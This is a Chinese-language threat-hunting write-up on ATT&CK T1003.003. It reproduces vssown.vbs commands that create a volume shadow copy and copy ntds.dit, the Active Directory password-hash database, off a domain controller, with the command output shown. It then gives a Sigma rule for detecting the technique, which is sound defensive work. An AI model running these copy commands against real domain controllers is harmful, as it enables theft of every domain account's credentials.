# T1003-003-win-使用vssown.vbs获得NTDS.dit文件

## 来自ATT&CK的描述

攻击者可能试图访问或创建Active Directory域数据库的副本，以便窃取凭据信息，以及获取有关域成员（例如设备，用户和访问权限）的其他信息。默认情况下，NTDS文件（NTDS.dit）位于%SystemRoot%\NTDS\Ntds.dit域控制器中。

除了在活动的域控制器上查找NTDS文件之外，攻击者还可能搜索包含相同或相似信息的备份。

下列工具和技术可用于枚举NTDS文件和整个Active Directory哈希的内容。
- 卷影复制
- secretsdump.py
- 使用内置的Windows工具ntdsutil.exe
- 调用卷影副本

### NTDS.dit

Ntds.dit文件是存储Active Directory数据的数据库，包括有关用户对象，组和组成员身份的信息。它包括域中所有用户的密码哈希值。域控制器（DC）上的ntds.dit文件只能由可以登录到DC的用户访问。很明显，保护这个文件至关重要，因为攻击者访问这个文件会导致整个域沦陷。

**默认情况下，NTDS文件将位于域控制器的％SystemRoot％\NTDS\Ntds.dit中。**但通常存储在其他逻辑驱动器上）。AD数据库是一个Jet数据库引擎，它使用可扩展存储引擎（ESE）提供数据存储和索引服务。通过ESE级别索引，可以快速定位对象属性。

## 测试案例

在2016+域控上使用 ntdsutil snapshot mount导出ntds.dit

### 创建快照

```dos
cscript vssown.vbs /start
cscript vssown.vbs /create c
cscript vssown.vbs /list
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\ntds\ntds.dit C:\
cscript vssown.vbs /delete
```

## 检测日志

windows 安全日志

## 测试复现

```dos
C:\Users\Administrator\Desktop\test>cscript vssown.vbs /start
Microsoft (R) Windows Script Host Version 5.812
版权所有(C) Microsoft Corporation。保留所有权利。

[*] Signal sent to start the VSS service.

C:\Users\Administrator\Desktop\test>cscript vssown.vbs /create c
Microsoft (R) Windows Script Host Version 5.812
版权所有(C) Microsoft Corporation。保留所有权利。

[*] Attempting to create a shadow copy.

C:\Users\Administrator\Desktop\test>cscript vssown.vbs /list
Microsoft (R) Windows Script Host Version 5.812
版权所有(C) Microsoft Corporation。保留所有权利。

SHADOW COPIES
=============

[*] ID:                  {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}
[*] Client accessible:   True
[*] Count:               1
[*] Device object:       \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
[*] Differential:        True
[*] Exposed locally:     False
[*] Exposed name:
[*] Exposed remotely:    False
[*] Hardware assisted:   False
[*] Imported:            False
[*] No auto release:     True
[*] Not surfaced:        False
[*] No writers:          True
[*] Originating machine: ICBC.abcc.org
[*] Persistent:          True
[*] Plex:                False
[*] Provider ID:         {B5946137-7B9F-4925-AF80-51ABD60B20D5}
[*] Service machine:     ICBC.abcc.org
[*] Set ID:              {584C48BF-649D-4B35-9CAE-3165C2C8BE53}
[*] State:               12
[*] Transportable:       False
[*] Volume name:         \\?\Volume{16da2094-7213-420f-a023-db7b3e3a7f6f}\


C:\Users\Administrator\Desktop\test>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\
已复制         1 个文件。

C:\Users\Administrator\Desktop\test>cscript vssown.vbs /delete
Microsoft (R) Windows Script Host Version 5.812
版权所有(C) Microsoft Corporation。保留所有权利。
```

## 测试留痕

测试留痕日志下载地址：<https://github.com/12306Bro/Threathunting-book/blob/master/Eventdata/vssown.evtx>

## 检测规则/思路

### sigma规则

```yml
title: 使用vssown.vbs拿到NTDS.dit文件
description: windows server 2016+ AD域控
tags: T1003-003
status: experimental
author: 12306Bro
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4688 #已创建新的进程。
        New processname: C:\Windows\System32\cscript.exe
        Process commandline:
           - cscript  *.vbs /start #基于命令行检测
           - cscript  *.vbs /create c #基于命令行检测
           - cscript  *.vbs /delete #基于命令行检测
           - cscript  *.vbs /list #基于命令行检测
    condition: selection
---
detection:
    selection1:
        EventID: 4904 #已试图注册安全事件源。
        Processname: C:\Windows\System32\VSSVC.exe
        Source name: VSSAudit #事件源
    selection2:
        EventID: 8222 #已创建影子副本。
        Process image name: C:\Windows\System32\wbem\WmiPrvSE.exe
        Raw volume: \\?\Volume{*}\ #"*"代表正则匹配
        Shadow device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy* #"*"代表正则匹配
    selection3:
        EventID: 4905 #已试图取消注册安全事件源。
        Processname: C:\Windows\System32\VSSVC.exe
        Source name: VSSAudit #事件源
    ​timeframe: last 10S #自定义时间范围
    condition: all of them
level: medium
```

### 建议

此检测特征仅适用于windows AD域控主机。

## 参考推荐

MITRE-ATT&CK-T1003-003

<https://attack.mitre.org/techniques/T1003/003>

vssown.vbs下载地址

<https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs>

域渗透——获得域控服务器的NTDS.dit文件

<https://xz.aliyun.com/t/2187>

MITRE ATT&CK攻击知识库（企业）中文版

<https://hansight.github.io/#/>
